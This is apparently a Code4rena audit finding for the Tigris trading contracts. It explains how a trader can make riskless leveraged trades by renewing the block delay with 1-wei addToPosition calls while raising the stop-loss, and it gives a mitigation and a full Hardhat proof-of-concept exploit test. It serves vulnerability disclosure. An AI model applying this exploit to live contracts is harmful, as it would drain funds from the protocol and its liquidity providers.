## Tags

- bug
- 3 (High Risk)
- primary issue
- selected for report
- sponsor confirmed
- H-02

# [Riskless trades due to delay check](https://github.com/code-423n4/2022-12-tigris-findings/issues/67) 

# Lines of code

https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L573


# Vulnerability details

# Riskless trades due to delay check

### Summary
`Trading.limitClose()` uses `_checkDelay()`. This allows for riskless trades, by capturing price rises through increasing the stop-loss, while preventing the underwater position to be closed in case of the price dropping by continuously increasing the delay.


### Detailed description
A malicious trader can exploit the `Trading` contract to achieve riskless trades. In the worst-case scenario, the trader can always close the trade break-even, while in a good scenario the trader captures all upside price movement.

The exploit is based on three principles:
1. The stop-loss of a position can be updated without any delay checks, due to `_checkDelay()` not being called in `updateTpSl()`
2. Positions can only be closed by MEV bots or other third parties after the block delay has been passed due to `limitClose` calling `_checkDelay()`
3. The block delay can be continuously renewed for a negligible cost

**Based on these three principles, the following method can be used to perform riskless trades:**
Assuming a current market price of 1,000 DAI, begin by opening a long limit order through `initiateLimitOrder()` at the current market price of 1,000 DAI and stop-loss at the exact market price of 1,000 DAI. Then immediately execute the limit order through `executeLimitOrder`.

After the block delay has passed, MEV bots or other third parties interested in receiving a percentage reward for closing the order would call `limitClose`. However, we can prevent them from doing so by continuously calling `addToPosition` with 1 wei when the block delay comes close to running out *[1]*, which will renew the delay and thus stops `limitClose` from being called.

While the trader keeps renewing the delay to stop his position from being closed, he watches the price development:
- If the price goes **down**, the trader will not make any loss, since he still has his original stop-loss set. He just has to make sure that the price does not drop too far to be liquidated through `liquidatePosition()`. If the price comes close to the liquidation zone, he stops renewing the delay and closes the position break-even for the initial stop-loss price even though the price is down significantly further. He can also choose to do that at any other point in time if he decides the price is unlikely to move upward again.
- If the price goes **up**, the trader calls `updateTpSl()` to lock in the increased price. For example, if the price moves from 1,000 DAI to 2,000 DAI, he calls `updateTpSl()` with 2,000 DAI as stop-loss. Even if the price drops below 2,000 DAI again, the stop-loss is stored. This function can be called while the delay is still in place because there is no call to `_checkDelay()`.

The trader keeps calling `updateTpSl()` when the price reaches a new high since he opened the position initially to capture all upside movement. When he decides that the price has moved high enough, he finally lets the delay run out and calls `limitClose()` to close the order at the peak stop-loss.


*Notes*
*[1]*: Tigris Trade also plans to use L2s such as Arbitrum where there is one block per transaction. This could bring up the false impression that the trader would have to make lots of calls to `addToPosition` after every few transactions on the chain. However, `block.number`, which is used by the contract, actually returns the L1 block number and not the L2 block number.

### Recommended mitigation
The core issue is that the position cannot be closed even if it is below the stop-loss due to constantly renewing the delay. The delay checking in `limitClose()` should be modified to also consider whether the position is below the stop-loss. 


### PoC
Insert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`:
```javascript
describe("PoC", function () {
    it.only("PoC", async function () {
      // Setup token balances and approvals
      const mockDAI = await ethers.getContractAt("MockERC20", MockDAI.address)
      await mockDAI.connect(owner).transfer(user.address, parseEther("10000"))
      await mockDAI.connect(owner).transfer(stablevault.address, parseEther("100000"))
      await mockDAI.connect(user).approve(trading.address, parseEther("10000"))
      const daiAtBeginning = await mockDAI.balanceOf(user.address)
      const permitData = [
        "0",
        "0",
        "0",
        "0x0000000000000000000000000000000000000000000000000000000000000000",
        "0x0000000000000000000000000000000000000000000000000000000000000000",
        false
      ]

      // Setup block delay to 5 blocks
      const blockDelay = 5;
      await trading.connect(owner).setBlockDelay(blockDelay)




      // ============================================================== //
      // =================== Create the limit order =================== //
      // ============================================================== //
      const tradeInfo = [
        parseEther("9000"),       // margin amount
        MockDAI.address,          // margin asset
        StableVault.address,      // stable vault
        parseEther("2"),          // leverage
        0,                        // asset id
        true,                     // direction (long)
        parseEther("0"),          // take profit price
        parseEther("1000"),       // stop loss price
        ethers.constants.HashZero // referral
      ];

      // Create the order
      await trading.connect(user).initiateLimitOrder(
        tradeInfo,            // trade info
        1,                    // order type (limit)
        parseEther("1000"),   // price
        permitData,           // permit
        user.address          // trader
      )



      // ============================================================== //
      // =================== Execute the limit order ================== //
      // ============================================================== //

      // Wait for some blocks to pass the delay
      await network.provider.send("evm_increaseTime", [10])
      for (let n = 0; n < blockDelay; n++) {
        await network.provider.send("evm_mine")
      }

      // Create the price data (the price hasn't changed)
      let priceData = [
        node.address,                                   // provider
        0,                                              // asset id
        parseEther("1000"),                             // price
        10000000,                                       // spread (0.1%)
        (await ethers.provider.getBlock()).timestamp,   // timestamp
        false                                           // is closed
      ]

      // Sign the price data
      let message = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]
        )
      );
      let sig = await node.signMessage(
        Buffer.from(message.substring(2), 'hex')
      )

      // Execute the limit order
      await trading.connect(user).executeLimitOrder(1, priceData, sig);






      // ============================================================== //
      // ================== Block bots from closing =================== //
      // ============================================================== //

      for (let i = 0; i < 5; i++) {

        /*
          This loop demonstrates blocking bots from closing the position even if the price falls below the stop loss.
          We constantly add 1 wei to the position when the delay is close to running out.
          This won't change anything about our position, but it will reset the delay timer,
          stopping bots from calling `limitClose()`. 

          This means that if the price drops, we can keep our position open with the higher stop loss, avoiding any losses.
          And if the price rises, we can push the stop loss higher to keep profits.

          The loop runs five times just to demonstrate. In reality, this could be done as long as needed.
        */


        // Blocks advanced to one block before the delay would pass
        await network.provider.send("evm_increaseTime", [10])
        for (let n = 0; n < blockDelay - 1; n++) {
          await network.provider.send("evm_mine")
        }




        // ============================================================== //
        // =========== Add 1 wei to position (price is down)  =========== //
        // ============================================================== //

        // Increase delay by calling addToPosition with 1 wei
        // Create the price data
        priceData = [
          node.address,                                   // provider
          0,                                              // asset id
          parseEther("900"),                              // price
          10000000,                                       // spread (0.1%)
          (await ethers.provider.getBlock()).timestamp,   // timestamp
          false                                           // is closed
        ]

        // Sign the price data - 
        message = ethers.utils.keccak256(
          ethers.utils.defaultAbiCoder.encode(
            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
            [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]
          )
        );
        sig = await node.signMessage(
          Buffer.from(message.substring(2), 'hex')
        )

        // Add to position
        await trading.connect(user).addToPosition(
          1,
          "1",
          priceData,
          sig,
          stablevault.address,
          MockDAI.address,
          permitData,
          user.address,
        )



        // ============================================================== //
        // ====================== Bots cannot close ===================== //
        // ============================================================== //

        // Bots cannot close the position even if the price is down below the stop loss
        await expect(trading.connect(user).limitClose(
          1,          // id
          false,      // take profit
          priceData,  // price data
          sig,        // signature
        )).to.be.revertedWith("0") // checkDelay

        // They can also not liquidate the position because the price is not down enough
        // If the price falls close to the liquidation zone, we can add more margin or simply close
        // the position, netting us the stop-loss price.
        await expect(trading.connect(user).liquidatePosition(
          1,          // id
          priceData,  // price data
          sig,        // signature
        )).to.be.reverted




        // ============================================================== //
        // =============== Increase SL when price is up  ================ //
        // ============================================================== //

        // Sign the price data (price has 5x'ed from initial price)
        priceData = [
          node.address,                                   // provider
          0,                                              // asset id
          parseEther("5000"),                             // price
          10000000,                                       // spread (0.1%)
          (await ethers.provider.getBlock()).timestamp,   // timestamp
          false                                           // is closed
        ]
        message = ethers.utils.keccak256(
          ethers.utils.defaultAbiCoder.encode(
            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
            [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]
          )
        );
        sig = await node.signMessage(
          Buffer.from(message.substring(2), 'hex')
        )

        // Update stop loss right at the current price
        await trading.connect(user).updateTpSl(
          false,                // type (sl)
          1,                    // id
          parseEther("5000"),   // sl price
          priceData,            // price data
          sig,                  // signature
          user.address,        // trader
        )
      }





      // ============================================================== //
      // ======================== Close order  ======================== //
      // ============================================================== //

      // When we are happy with the profit, we stop increasing the delay and close the position

      // Wait for some blocks to pass the delay
      await network.provider.send("evm_increaseTime", [10])
      for (let n = 0; n < blockDelay; n++) {
        await network.provider.send("evm_mine")
      }

      // Close order
      await trading.connect(user).limitClose(
        1,          // id
        false,      // take profit
        priceData,  // price data
        sig,        // signature
      )

      // Withdraw to DAI
      const amount = await stabletoken.balanceOf(user.address)
      await stablevault.connect(user).withdraw(MockDAI.address, amount)

      // Print results
      const daiAtEnd = await mockDAI.balanceOf(user.address)
      const tenPow18 = "1000000000000000000"
      const diff = (daiAtEnd - daiAtBeginning).toString() / tenPow18
      console.log(`Profit: ${diff} DAI`)
    })
})
```